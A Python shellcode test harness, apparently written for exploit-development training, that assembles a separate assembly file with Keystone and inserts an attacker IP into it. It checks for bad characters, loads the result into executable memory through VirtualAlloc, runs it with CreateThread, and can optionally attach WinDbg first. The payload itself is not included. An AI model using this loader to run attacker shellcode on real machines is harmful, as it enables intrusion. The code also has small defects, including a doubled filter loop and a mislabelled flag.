#!/usr/bin/env python3
import ctypes
import struct
from keystone import *
import re
import argparse

parser = argparse.ArgumentParser(description="Provide a path to an assembly file.")
parser.add_argument(
    "path",
    type=str,
    help="Path to the assembly file",
    nargs="?",
    default="z:\\exercises\\H7\\test.asm",
)
parser.add_argument(
    "--localdebugging", action="store_true", help="Enable local debugging"
)
parser.add_argument(
    "--x64", action="store_true", help="x32 shellcode"
)
args = parser.parse_args()

print(args.path)

try:
    with open(r"z:\miscs\attacker-ip.txt") as f:
        ip = f.read()
    print("attacker ip:", ip)
except FileNotFoundError:
    ip = "127.0.0.1"

ip_enc = "0x" + "".join([f"{int(byte):02x}" for byte in ip.split(".")[::-1]])


def asm_remove_comments(input_asm):
    CODE = re.sub(r"(?m)^\s*#.*\n?", "", input_asm)
    return re.sub(r";.*", ";", CODE).strip()

ip_enc = "0x" + "".join([f"{int(byte):02x}" for byte in ip.split(".")[::-1]])
try:
    with open(args.path, "r") as f:
        CODE = f.read().replace("REPLACE_THIS_WITH_IP", ip_enc)
        print(CODE)
except FileNotFoundError:
    print("PLease provide a path that exists.")
    exit()

CODE = asm_remove_comments(CODE)
known_bad = [
    b"\x00",
    b"\x0a",  # becomes \xb0
    b"\x20",
    b"\x80",
    b"\x81",
    b"\x86",
]


def generate_without_bad_chars(input="", bad_chars_array=[]):
    filterd = b""
    for counter, i in enumerate(input.encode()):
        if not (i in b"".join(bad_chars_array)):
            filterd += chr(i).encode("latin-1")
        else:
            print(f"filtered: {str(counter)} ", chr(i).encode("latin-1"))
    print(input.encode("latin-1"))
    for counter, i in enumerate(input.encode()):
        if not (i in b"".join(bad_chars_array)):
            filterd += chr(i).encode("latin-1")
        else:
            print(f"filtered: {str(counter)} ", chr(i).encode("latin-1"))
    return filterd


print("using Ks to encode:")
if args.x64:
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
else:
    ks = Ks(KS_ARCH_X86, KS_MODE_32)

encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)

# generate_without_bad_chars(sh.decode('latin-1'), known_bad)

shell_code = bytearray(sh)
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shell_code)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40),
)

buf = (ctypes.c_char * len(shell_code)).from_buffer(shell_code)

if args.x64:
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int64(ptr), buf, ctypes.c_int64(len(shell_code)))
else:
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shell_code)))



def escape_all_characters(buffer):
    result = []
    for byte in buffer:
        result.append(f"\\x{byte:02x}")
    return "".join(result)


print(escape_all_characters(shell_code))

bad_chars = [0x00, 0x0A]
for counter, i in enumerate(sh):
    if i in bad_chars:
        print(f"{str(counter + 1)}: Bad char ({hex(i)})")

print("shell_code located at address %s" % hex(ptr))

share_path = r"\\tsclient\_home_deadbeef_github_win-kernel-d\\"

if args.localdebugging:
    import subprocess
    import ctypes
    import os

    # Function to get the process ID of the current Python script
    def get_current_process_id():
        return os.getpid()

    # Function to start WinDbg and attach it to the current process
    def attach_windbg_to_current_process():
        pid = get_current_process_id()
        own_infra = True
        if own_infra:
            windbg_path = (
                r"WinDbgX.exe"
            )
            startup_script = fr"{share_path}general-debugging-reminders\windbg-include-files.wds"
            custom_script_1 = r"C:\Users\deadbeef\github\OSED\scripts\self_hosted_OSED_machine\scripts\custom-shellcode-1.wds"
        else:
            windbg_path = r"C:\Program Files\Windows Kits\10\Debuggers\x86\windbg.exe"
            startup_script = r"Z:\scripts\main_caller\startup-script.wds"
            custom_script_1 = r"Z:\exam\box2\debug-windbg\debugfile.wds"
        windbg_command = [
            windbg_path,
            "-c", "g", # first occurence (default breakpoint, g)
            "-c",
            f"$$>a<{startup_script}",
            "-c",
            ".echo test",
            # "-c",
            # f"$$>a<{custom_script_1}",
            "-p",
            str(pid),
        ]
        subprocess.Popen(windbg_command)

    # Call the function to attach WinDbg to the current process
    attach_windbg_to_current_process()

    import time

    def is_debugger_attached():
        return ctypes.windll.kernel32.IsDebuggerPresent()

    while not is_debugger_attached():
        # print("Waiting for debugger...")
        time.sleep(1)


if args.x64:
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_uint64(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
else:
    ht = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0)),
    )

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))